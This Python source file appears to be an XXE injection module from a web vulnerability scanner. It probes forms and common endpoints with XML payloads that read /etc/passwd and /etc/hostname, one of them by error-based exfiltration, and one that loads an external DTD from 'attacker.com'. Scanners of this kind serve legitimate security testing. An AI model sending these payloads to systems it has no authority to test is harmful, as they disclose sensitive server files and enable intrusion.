import logging
import re
import textwrap
from urllib.parse import urljoin
from typing import Dict, List, Optional
from core.base_scanner import BaseScanner
from core.utils import RequestUtils

class XXEInjectionScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [ <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
               <foo>&xxe;</foo>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE data [
               <!ENTITY file SYSTEM "file:///etc/hostname">
               ]>
               <data>&file;</data>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE data [
               <!ENTITY % file SYSTEM "file:///etc/passwd">
               <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
               %eval;
               %error;
               ]>
               <data>test</data>""",
            
            """<?xml version="1.0" encoding="UTF-8"?>
               <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; ]>
               <test>test</test>"""
        ]

    def scan(self) -> Dict:
        try:
            tasks = []
            response = self.make_request(self.target_url)
            
            if not response:
                return {'xxe_injection': []}

            # Find XML endpoints and forms
            forms = RequestUtils.extract_forms(response.text)
            for form in forms:
                if self.is_xml_endpoint(form):
                    form_url = urljoin(self.target_url, form['action'] or self.target_url)
                    tasks.append({
                        'type': 'form',
                        'url': form_url,
                        'method': form['method'],
                        'content_type': 'application/xml'
                    })

            # Test common XML endpoints
            common_endpoints = ['/upload', '/import', '/api/data', '/xml', '/soap']
            for endpoint in common_endpoints:
                endpoint_url = urljoin(self.target_url, endpoint)
                tasks.append({
                    'type': 'endpoint',
                    'url': endpoint_url,
                    'method': 'POST',
                    'content_type': 'application/xml'
                })

            results = self.run_concurrent_tasks(tasks)
            return {'xxe_injection': results}

        except Exception as e:
            logging.error(f"XXE Injection scanner error: {e}")
            return {'xxe_injection': [], 'error': str(e)}

    def execute_task(self, task: Dict) -> Optional[Dict]:
        """Implement the required execute_task method"""
        try:
            for payload in self.payloads:
                result = self.test_xxe_injection(
                    task['url'],
                    task['method'],
                    payload,
                    task['content_type']
                )
                if result:
                    return {
                        'url': task['url'],
                        'method': task['method'],
                        'payload': payload,
                        'type': 'XXE Injection',
                        'severity': 'High',
                        'evidence': result
                    }
            return None

        except Exception as e:
            logging.error(f"Error in XXE injection task: {e}")
            return None

    def test_xxe_injection(self, url: str, method: str, payload: str, content_type: str) -> Optional[str]:
        try:
            headers = {'Content-Type': content_type}
            response = self.make_request(
                url,
                method=method.upper(),
                data=payload,
                headers=headers
            )

            if not response:
                return None

            # Check for file content disclosure
            sensitive_patterns = [
                r'root:.*:0:0:',          # /etc/passwd content
                r'HOST=.*',                # hostname content
                r'<?xml.*version=',        # XML parsing error
                r'<!DOCTYPE.*>',           # DOCTYPE reflection
                r'SimpleXMLElement',       # PHP XML parser
                r'javax.xml',              # Java XML parser
                r'org.xml.sax',            # SAX parser
                r'XML parsing error',      # Generic XML error
                r'Warning: simplexml_load'  # PHP warning
            ]

            for pattern in sensitive_patterns:
                if re.search(pattern, response.text):
                    return f"XXE pattern detected: {pattern}"

            # Check for error messages
            error_patterns = [
                'java.io.FileNotFoundException',
                'System.Xml',
                'XML document structures must start and end within the same entity',
                'XML parsing error',
                'error on line'
            ]

            for error in error_patterns:
                if error.lower() in response.text.lower():
                    return f"XXE error detected: {error}"

            return None

        except Exception as e:
            logging.error(f"Error testing XXE injection: {e}")
            return None

    def is_xml_endpoint(self, form: Dict) -> bool:
        """Check if the form or endpoint likely accepts XML input"""
        form_str = str(form).lower()
        xml_indicators = [
            'xml',
            'import',
            'upload',
            'soap',
            'data',
            'feed',
            'rss',
            'atom'
        ]
        return any(indicator in form_str for indicator in xml_indicators)

    def extract_url_parameters(self, url: str) -> List[str]:
        try:
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            return list(params.keys())
        except Exception as e:
            logging.error(f"Error extracting URL parameters: {e}")
            return []

    def test_xxe(self, url: str, method: str, param: str, payload: str, direct: bool = False) -> bool:

        headers = {"Content-Type": "application/xml"}
        benign_payload = textwrap.dedent("""\
            <?xml version="1.0"?>
            <foo>test</foo>""")

        try:
            if direct:
                normal_response = self.make_request(
                    url,
                    method="POST",
                    data=benign_payload,
                    headers=headers
                )
                response = self.make_request(
                    url,
                    method="POST",
                    data=payload,
                    headers=headers
                )
            else:
                normal_data = {param: benign_payload}
                normal_response = self.make_request(
                    url,
                    method=method.upper(),
                    data=normal_data if method.lower() == 'post' else None,
                    params=normal_data if method.lower() == 'get' else None,
                    headers=headers if method.lower() == 'post' else None
                )
                data = {param: payload}
                response = self.make_request(
                    url,
                    method=method.upper(),
                    data=data if method.lower() == 'post' else None,
                    params=data if method.lower() == 'get' else None,
                    headers=headers if method.lower() == 'post' else None
                )
            
            if not response or not normal_response:
                return False

            file_signs = ["root:", "daemon:", "bin:"]
            for sign in file_signs:
                if sign in response.text and sign not in normal_response.text:
                    logging.info(f"Potential XXE vulnerability detected at {url} using payload: {payload}")
                    return True

            error_patterns = ["Entity", "DOCTYPE", "XML", "fatal error"]
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE) and not re.search(pattern, normal_response.text, re.IGNORECASE):
                    logging.info(f"Potential XXE vulnerability detected at {url} using payload: {payload} (error pattern match)")
                    return True

            return False
        except Exception as e:
            logging.error(f"Error testing XXE on {url} for parameter '{param}': {e}")
            return False